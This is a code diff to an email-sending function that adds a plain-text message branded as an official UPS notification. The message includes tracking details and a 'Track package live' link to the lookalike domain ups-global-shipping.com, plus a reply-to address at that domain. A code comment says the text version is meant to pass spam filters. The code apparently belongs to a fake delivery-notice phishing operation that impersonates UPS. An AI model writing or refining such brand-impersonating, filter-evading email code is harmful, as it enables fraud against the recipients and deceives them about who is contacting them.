@@ -150,6 +150,18 @@ export async function sendEmail({ to, recipientName, subject, messageBody, templ
     buttonUrl: buttonUrl
   });
 
+  // Build clean plain text version (Crucial for spam filter pass)
+  const textContent = `UPS Global Logistics - Official Notification
+
+Hello ${recipientName || to.split('@')[0]},
+
+${messageBody}
+
+${trackingCode ? `Tracking Code: ${trackingCode}\nStatus: ${status || 'IN TRANSIT'}\nRoute: ${origin || 'N/A'} -> ${destination || 'N/A'}\n` : ''}
+Track package live: ${buttonUrl || 'https://ups-global-shipping.com'}
+
+UPS Logistics Services • Global Parcel Delivery Network`;
+
   if (!apiKey) {
     console.warn('[EMAIL SERVICE WARNING] RESEND_API_KEY is missing in backend .env. Simulation mode only.');
     console.log(`[SIMULATED EMAIL] To: ${to} | Subject: ${emailSubject}`);
@@ -161,8 +173,13 @@ export async function sendEmail({ to, recipientName, subject, messageBody, templ
     const response = await resend.emails.send({
       from: fromEmail,
       to: [to],
+      replyTo: 'support@ups-global-shipping.com',
       subject: emailSubject,
-      html: html
+      html: html,
+      text: textContent,
+      headers: {
+        'X-Entity-Ref-ID': `UPS-MSG-${Date.now()}`
+      }
     });
 
     if (response.error) {
